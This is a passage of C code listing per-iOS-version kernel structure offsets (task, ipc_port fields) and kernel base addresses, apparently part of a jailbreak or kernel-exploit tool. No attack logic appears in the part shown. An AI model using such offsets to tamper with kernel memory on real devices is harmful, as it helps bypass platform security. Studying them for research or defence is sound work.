            kinfo->kernel_phys_base = 0x80001000;
            kinfo->mem_base = 0x80000000;
            break;
        case 6:
            kinfo->offsets.task.ref_count = 0xc;
            kinfo->offsets.task.bsd_info = 0x1e0;
            kinfo->offsets.ipc_port.ip_references = 0x4;
            kinfo->offsets.ipc_port.ip_kobject = 0x44;
            kinfo->offsets.ipc_port.size = 0x70;
            kinfo->kernel_static_base = 0x80001000;
            kinfo->kernel_phys_base = 0x80001000;
            kinfo->mem_base = 0x80000000;
            break;
        case 5:
            kinfo->offsets.task.ref_count = 0xc;
            kinfo->offsets.task.bsd_info = 0x1ec;
            kinfo->offsets.ipc_port.ip_references = 0x4;
            kinfo->offsets.ipc_port.ip_kobject = 0x40;
            kinfo->offsets.ipc_port.size = 0x74;
            kinfo->kernel_static_base = 0x80001000;
            kinfo->kernel_phys_base = 0x80001000;
            kinfo->mem_base = 0x80000000;
            break;
        case 4:
            kinfo->offsets.task.ref_count = 0xc;
            kinfo->offsets.task.bsd_info = 0x1cc;
            kinfo->offsets.ipc_port.ip_references = 0x4;
            kinfo->offsets.ipc_port.ip_kobject = 0x40;
            kinfo->offsets.ipc_port.size = 0x6c;
            kinfo->kernel_static_base = 0x80001000;
            kinfo->kernel_phys_base = 0x80001000;
            kinfo->mem_base = 0x80000000;
            break;
        case 3:
            kinfo->offsets.task.ref_count = 0xc;
            kinfo->offsets.task.bsd_info = 0x1c4;
            kinfo->offsets.ipc_port.ip_references = 0x0;
            kinfo->offsets.ipc_port.ip_kobject = 0x40;
            kinfo->offsets.ipc_port.size = 0x90;
            if (kinfo->version[1] == 1) {
                kinfo->kernel_static_base = 0xc0008000;
                kinfo->kernel_phys_base = 0x40008000;
                kinfo->mem_base = 0x40000000;
            } else {
                kinfo->kernel_static_base = 0x80001000;
                kinfo->kernel_phys_base = 0x80001000;
                kinfo->mem_base = 0x80000000;
            }
            break;
        default:
            break;
    }
    return 0;
}

```